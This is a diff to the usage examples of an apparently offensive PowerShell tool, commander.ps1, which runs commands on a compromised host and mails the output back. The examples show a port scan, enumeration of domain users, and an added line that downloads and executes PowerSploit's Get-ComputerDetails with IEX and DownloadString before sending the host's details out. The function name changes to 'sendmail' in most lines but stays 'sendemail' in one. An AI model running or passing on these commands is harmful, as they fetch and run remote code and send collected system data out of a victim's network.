@@ -21,5 +21,12 @@ Examples:
 .\commander.ps1 '$var = 1..1024 | % { echo ((new-object Net.Sockets.TcpClient).Connect("10.10.10.10",$_)) "$_ is open"; sendemail $var ~123434'
 
 # Get domain users (Net user /domain) but parsed for powershell output
-.\commander.ps1 '$output = net user /domain;$output = $output[6..($output.length-3)];$output = $output -split "\s+" ;$output = $output | ? {$_}; sendemail $output ~123434'
+.\commander.ps1 '$output = net user /domain;$output = $output[6..($output.length-3)];$output = $output -split "\s+" ;$output = $output | ? {$_}; sendmail $output ~123434'
+
+#Load and Run external module from github
+.\commander.ps1 'IEX (New-Object System.Net.Webclient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Get-ComputerDetails.ps1");sendmail "Get-Computerdetails.ps1 LOADED!" ~123434' 
+Get everything
+.\commander.ps1 '$var = get-computerdetails|out-string;sendmail $var ~123434'
+Get only one member (Cleaner looking)
+.\commander.ps1 '$var1 = $var.rdpclientdata|out-string;sendmail $var1 ~123434'
 
